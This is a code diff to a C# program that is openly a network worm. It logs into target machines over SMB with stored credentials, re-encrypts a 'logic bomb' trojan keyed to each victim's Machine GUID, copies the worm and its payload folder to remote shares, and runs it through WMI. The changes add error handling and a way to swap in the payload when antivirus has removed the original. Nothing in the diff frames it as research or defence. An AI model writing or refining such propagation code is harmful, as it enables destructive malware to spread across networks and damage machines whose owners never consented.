@@ -333,7 +333,6 @@ class Program
         LogInfo($"--- Processing target: {ip} ---");
         string remoteShareUNC = $"\\\\{ip}\\{SMB_SHARE_NAME}";
 
-        // Check if Worm already running on target
         if (IsWormAlreadyRunningOnTarget(ip))
         {
             LogInfo($"Worm already running on {ip}, skipping");
@@ -344,57 +343,110 @@ class Program
 
         if (smbConnectResult == 0)
         {
+            LogSuccess($"Connected to {ip}");
+            bool propagationSucceeded = true;
+
             try
             {
-                LogSuccess($"Connected to {ip}");
-
-                // Get victim's Machine GUID
                 string victimMachineGuid = GetRemoteMachineGuid(ip, SMB_USERNAME, SMB_PASSWORD);
                 LogInfo($"Victim Machine GUID: {victimMachineGuid}");
 
-                // Re-encrypt for victim
                 string victimSpecificBomb = Path.Combine(tempFolder, "bomb_victim.encrypted");
                 ReEncryptTrojanForVictim(tempFolder, victimSpecificBomb, victimMachineGuid);
 
-                // Copy files
-                string localWormPath = Path.Combine(tempFolder, WORM_EXE_NAME);
-                string remoteWormPath = Path.Combine(remoteShareUNC, WORM_EXE_NAME);
-                File.Copy(localWormPath, remoteWormPath, true);
+                // --- FILE COPY LOGIC ---
 
-                string localPayloadFolder = Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME);
-                string remotePayloadFolder = Path.Combine(remoteShareUNC, PAYLOAD_FOLDER_NAME);
-                await CopyFolderAsync(localPayloadFolder, remotePayloadFolder);
-
-                string remoteBombPath = Path.Combine(remotePayloadFolder, ENCRYPTED_BOMB_NAME);
-                File.Copy(victimSpecificBomb, remoteBombPath, true);
-
-                LogSuccess($"Files copied to {ip}");
-
-                // Set file attributes on remote files
-                SetRemoteFileAttributes(ip, remoteShareUNC);
-
-                // Execute ONLY Worm on victim (fire-and-forget)
-                string remoteWormExePath = $"C:\\{SMB_SHARE_NAME}\\{WORM_EXE_NAME}";
-                bool wormExecuted = ExecuteRemoteCommandWMI(ip, SMB_USERNAME, SMB_PASSWORD, remoteWormExePath, "Worm");
-
-                if (wormExecuted)
+                // 1. Copy Worm.exe
+                try
                 {
-                    LogSuccess($"Successfully propagated to {ip} (Worm will handle LogicBomb locally)");
+                    string localWormPath = Path.Combine(tempFolder, WORM_EXE_NAME);
+                    string remoteWormPath = Path.Combine(remoteShareUNC, WORM_EXE_NAME);
+                    LogInfo($"Attempting to copy {WORM_EXE_NAME} to {ip}...");
+                    File.Copy(localWormPath, remoteWormPath, true);
+                    LogSuccess($"{WORM_EXE_NAME} copied successfully.");
+                }
+                catch (Exception ex)
+                {
+                    LogError($"Failed to copy {WORM_EXE_NAME}: {ex.Message}");
+                    propagationSucceeded = false;
+                }
+
+                // 2. Copy Payload Folder
+                if (propagationSucceeded)
+                {
+                    try
+                    {
+                        string localPayloadFolder = Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME);
+                        string remotePayloadFolder = Path.Combine(remoteShareUNC, PAYLOAD_FOLDER_NAME);
+                        LogInfo($"Attempting to copy '{PAYLOAD_FOLDER_NAME}' folder to {ip}...");
+                        await CopyFolderAsync(localPayloadFolder, remotePayloadFolder);
+                        LogSuccess($"'{PAYLOAD_FOLDER_NAME}' folder copied successfully.");
+                    }
+                    catch (Exception ex)
+                    {
+                        LogError($"Failed to copy '{PAYLOAD_FOLDER_NAME}' folder: {ex.Message}");
+                        propagationSucceeded = false;
+                    }
+                }
+
+                // 3. *** FIX: Delete original bomb, then copy the re-encrypted one ***
+                if (propagationSucceeded)
+                {
+                    string remoteBombPath = Path.Combine(remoteShareUNC, PAYLOAD_FOLDER_NAME, ENCRYPTED_BOMB_NAME);
+                    try
+                    {
+                        // First, try to delete the bomb that was just copied with the folder.
+                        LogInfo($"Attempting to delete original bomb at {remoteBombPath}...");
+                        if (File.Exists(remoteBombPath))
+                        {
+                            File.Delete(remoteBombPath);
+                            LogSuccess($"Original bomb deleted successfully.");
+                        }
+                        else
+                        {
+                            LogWarning("Original bomb not found, may have been blocked by AV. Proceeding to copy.");
+                        }
+
+                        // Now, copy the new, re-encrypted bomb. This is now a 'create' operation.
+                        LogInfo($"Attempting to copy re-encrypted bomb to {remoteBombPath}...");
+                        File.Copy(victimSpecificBomb, remoteBombPath, false); // 'false' for no overwrite
+                        LogSuccess($"Re-encrypted bomb copied successfully.");
+                    }
+                    catch (Exception ex)
+                    {
+                        LogError($"Failed to replace the encrypted bomb: {ex.Message}");
+                        propagationSucceeded = false;
+                    }
+                }
+
+                if (propagationSucceeded)
+                {
+                    LogSuccess($"All files copied successfully to {ip}");
+                    SetRemoteFileAttributes(ip, remoteShareUNC);
+
+                    string remoteWormExePath = $"C:\\{SMB_SHARE_NAME}\\{WORM_EXE_NAME}";
+                    LogInfo($"Attempting to execute Worm remotely on {ip} via WMI...");
+                    bool wormExecuted = ExecuteRemoteCommandWMI(ip, SMB_USERNAME, SMB_PASSWORD, remoteWormExePath, "Worm");
+
+                    if (wormExecuted)
+                    {
+                        LogSuccess($"Successfully propagated and executed on {ip}. A new log will be created on the victim machine.");
+                    }
+                    else
+                    {
+                        LogWarning($"File copy succeeded but execution failed on {ip}. The payload was likely blocked by antivirus.");
+                    }
                 }
                 else
                 {
-                    LogWarning($"File copy succeeded but execution failed on {ip}");
+                    LogError($"Propagation to {ip} failed due to file copy errors. Aborting execution step.");
                 }
 
-                // Cleanup
-                if (File.Exists(victimSpecificBomb))
-                {
-                    File.Delete(victimSpecificBomb);
-                }
+                if (File.Exists(victimSpecificBomb)) File.Delete(victimSpecificBomb);
             }
             catch (Exception ex)
             {
-                LogError($"Error processing {ip}: {ex.Message}");
+                LogError($"A critical error occurred while processing {ip}: {ex.Message}");
             }
             finally
             {
